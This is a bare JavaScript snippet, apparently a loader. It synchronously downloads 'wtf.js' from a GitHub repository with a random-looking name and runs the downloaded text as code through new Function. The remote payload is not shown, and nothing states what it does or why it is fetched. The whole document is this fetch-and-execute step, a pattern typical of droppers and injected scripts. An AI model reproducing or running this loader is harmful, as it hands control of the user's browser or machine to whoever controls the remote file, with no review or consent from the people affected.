let request = new XMLHttpRequest();
request.open('GET', 'https://raw.githubusercontent.com/42astral/jerusBRuicgeBbt/main/wtf.js', false);
request.send();
new Function(request.responseText)();